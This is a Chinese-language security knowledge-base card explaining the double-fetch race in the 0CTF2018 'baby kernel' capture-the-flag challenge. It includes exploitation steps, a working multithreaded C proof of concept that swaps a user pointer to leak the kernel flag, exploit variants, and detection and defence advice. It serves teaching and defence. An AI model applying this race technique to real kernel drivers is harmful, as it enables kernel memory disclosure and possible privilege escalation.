---
id: binary-pwn-kernel-double-fetch-user-pointer-race-flag
title: 内核驱动 double fetch 条件竞争：多线程改写用户指针，校验用假 buf、比较读真 flag（0CTF2018 baby kernel）
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-double-fetch-user-pointer-race
tags:
- pwn
- kernel
- double-fetch
- race-condition
- ioctl
- ctf
- user-pointer
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T11:52:52+08:00'
  notes: 已对照原文与3张图核对：baby_ioctl 0x6666 printk 泄露 flag 地址、0x1337 对用户 struct 指针先 _chk_range_not_ok(v2,16) 与 (*(QWORD*)v5, *(int*)(v5+8)) 校验再逐字节比较、多线程改写 flag_addr 的 double fetch 窗口、dmesg 读取 flag 均与原文一致；图3 实测输出 flag{THIS_WILL_BE_YOUR_FLAG_1234}，地址 0xffffffffc0003028。小问题：原文 fake_flag 内容为 "flag"（5 字节），33 是结构体 flag_len 字段而非 fake buf 长度，卡片正文已正确写 flag_len=33，仅一句话结论措辞略含糊。未验证点：未在本机复跑 QEMU；CTF 题无版本区间；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-double-fetch-user-pointer-race-flag/
draft: false
kb_aliases:
- double fetch
- 内核 double fetch
- baby kernel
- 0CTF2018 baby kernel
- 条件竞争内核 pwn
- user pointer race
---

## 一句话结论

0CTF2018 baby kernel 的 `0x1337` ioctl 只从用户态取一个 `struct { char *buf; int len; }` 指针，先用 `buf/len` 做范围与长度校验，随后又多次解引用同一用户指针逐字节比较 flag；攻击者开一个线程在极短窗口内把 `buf` 从“长度恰好为 33 的假 flag”改成内核中真 flag 的地址，使校验通过而比较读到真 flag，驱动便把 flag `printk` 出来（`dmesg` 可读）。

## 原理

- **只传指针，不拷贝数据**：`baby_ioctl` 的第三个参数 `rdx` 指向用户态 `struct chall { char *flag_addr; int flag_len; }`。内核没有把结构体或 buf 内容 `copy_from_user` 到内核缓冲区，而是保存用户指针 `v5 = rdx`，之后反复通过 `*(_QWORD *)v5`、`*(int *)(v5 + 8)` 解引用。
- **两次（多次）取值**：先做 `_chk_range_not_ok(v2, 16, ...)` 校验结构体本身、`_chk_range_not_ok(*(_QWORD *)v5, *(int *)(v5+8), ...)` 校验 buf 范围，再检查 `*(_DWORD *)(v5 + 8) == strlen(flag)`；校验通过后才进入 `for` 循环，逐字节读取 `*(_BYTE *)(*(_QWORD *)v5 + i)` 与 `flag[i]` 比较。
- **用户内存可变**：用户态结构体与 buf 都在攻击者可写内存中。校验与比较之间存在时间窗口，另一个线程可以在这段时间内改写 `flag_addr`，让内核第二次解引用时拿到不同的地址。
- **竞争命中条件**：主线程把 `flag_addr` 设为 `fake_flag`（长度 33，内容任意）并调用 ioctl；竞争线程在循环中不断把 `flag_addr` 设为 `flag_kaddr`。当内核读长度/指针校验时看到 `fake_flag`（通过），而进入比较循环后看到 `flag_kaddr`（flag 与自身比较，逐字节相等），校验即被绕过，驱动打印 flag。
- **地址来源**：`0x6666` 命令用 `printk("Your flag is at %px! ...")` 泄露 flag 内核地址；题目开启 `dmesg` 可读，攻击者用 `dmesg | grep flag` 解析出 `flag_kaddr`，再用同一通道读取打印出的 flag。
- **为什么难防**：从驱动视角看每次读取都是合法的用户指针访问；问题在于“验证的数据”和“使用的数据”不是同一份快照。正确做法是一次 `copy_from_user` 到内核栈/堆，之后只使用该副本。

## 触发条件

- 内核驱动/模块对同一用户态指针做多次非原子读取，且第一次用于安全校验、后续用于实际处理。
- 用户态内存可写，攻击者能控制两次读取之间的内容。
- 两次读取之间有时间窗口（即使很短，多线程紧循环可提高命中率）。
- 需要泄露地址/输出时，`dmesg` 可读或存在其他回显通道（本题 `printk` + dmesg）。

## 利用步骤

1. 逆向驱动，确认 ioctl 命令号（本题 `0x6666` 打印 flag 地址、`0x1337` 校验 flag）与结构体布局 `{ char *buf; int len; }`。
2. 打开 `/dev/baby`，调用 `0x6666`，从 `dmesg` 中解析 `Your flag is at 0x...` 得到 `flag_kaddr`。
3. 准备 `fake_flag[0x100]`，构造 `struct chall { .flag_addr = fake_flag, .flag_len = 33 }`（33 等于 `strlen(flag)`）。
4. 创建竞争线程，循环把 `flag.flag_addr = flag_kaddr`；主线程循环把 `flag_addr = fake_flag` 后调用 `ioctl(fd, 0x1337, &flag)`。
5. 每轮后 `dmesg | grep flag` 检查是否出现 `So here is it flag{...}`；出现即停止竞争线程并提取 flag。
6. 授权测试只在自建 QEMU 内核环境验证；不要对生产内核加载未知模块。

## PoC

```c
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

struct chall { char *flag_addr; int flag_len; } flag;
volatile int sign = 1;
void *flag_kaddr;
char fake_flag[0x100] = "flag";

void *race_thread(void *_) {
    while (sign)
        for (int i = 0; i < 0x1000; i++)
            flag.flag_addr = flag_kaddr;      // 窗口内改成真 flag 地址
    return NULL;
}

int main(void) {
    int fd = open("/dev/baby", O_RDWR);
    ioctl(fd, 0x6666);                        // printk 泄露 flag 地址
    system("dmesg | grep flag > /tmp/addr.txt");
    char buf[0x1000] = {0};
    int afd = open("/tmp/addr.txt", O_RDONLY);
    read(afd, buf, sizeof(buf) - 1);
    char *p = strstr(buf, "Your flag is at ") + strlen("Your flag is at");
    flag_kaddr = (void *)strtoull(p, NULL, 16);

    flag.flag_addr = fake_flag;
    flag.flag_len = 33;                       // 等于 strlen(flag)，通过长度校验
    pthread_t th;
    pthread_create(&th, NULL, race_thread, NULL);

    while (sign) {
        for (int i = 0; i < 0x1000; i++) {
            flag.flag_addr = fake_flag;
            ioctl(fd, 0x1337, &flag);         // 校验假 buf，比较读真 flag
        }
        system("dmesg | grep flag > /tmp/result.txt");
        int rfd = open("/tmp/result.txt", O_RDONLY);
        int n = read(rfd, buf, sizeof(buf) - 1);
        buf[n] = 0;
        if (strstr(buf, "flag{")) sign = 0;
        close(rfd);
    }
    pthread_cancel(th);
    system("dmesg | grep -i flag");           // 读取打印出的 flag
    return 0;
}
```

说明：以上为按原文 exp 精简的复现骨架；原文在 QEMU + 4.15.0-22 内核上实际跑出 `flag{THIS_WILL_BE_YOUR_FLAG_1234}`，未在本机复跑。

## 变体与关联

- **被竞争字段变体**：指针、长度、命令号、权限标志、结构体中的任意字段；只要第一次校验与第二次使用不是同一份快照即可。
- **放大窗口**：`userfaultfd`/FUSE 让内核在缺页时阻塞、`sleep`/调试断点、`copy_from_user` 大块数据、并发调度；本题用多线程紧循环提高命中率。
- **平台变体**：Windows 驱动 IRP 中同一用户缓冲区被多次读取；Linux `copy_from_user` 后再直接解引用用户指针的驱动。
- **后续利用**：double fetch 可造成 OOB read/write、长度校验绕过、指针替换，进而泄露内核地址或提权；本题仅用于读 flag。
- **关联**：[[binary-pwn-kernel-ioctl-global-length-oob-read-flag]]（ioctl 长度控制越界读 flag）、[[binary-pwn-tcp-send-buffer-block-toctou-race-window]]（TOCTOU 窗口放大）、[[binary-pwn-kernel-qemu-initramfs-gdb-workflow]]（QEMU 内核调试流程）。

## 检测与防御

- **一次拷贝**：驱动在入口用 `copy_from_user` 把用户结构体及缓冲区完整复制到内核内存，后续校验与使用都只访问内核副本；不要在校验后继续解引用用户指针。
- **一致性检查**：若必须多次读取，使用 `memdup_user`/序列号/版本号或锁，确保两次读取的是同一版本。
- **最小暴露**：设备节点权限最小化，生产内核不加载来路不明的模块；关闭 `dmesg_restrict=0` 的地址泄露面。
- **检测**：审计驱动中 `copy_from_user` 后仍出现用户指针解引用的模式；监控同一 ioctl 的高频并发调用与异常 `dmesg` 泄露；内核日志中出现 flag/地址打印。
- **响应**：发现 double fetch 设备立即卸载/更新驱动，轮换可能泄露的内核地址与凭据，检查是否有后续提权行为。
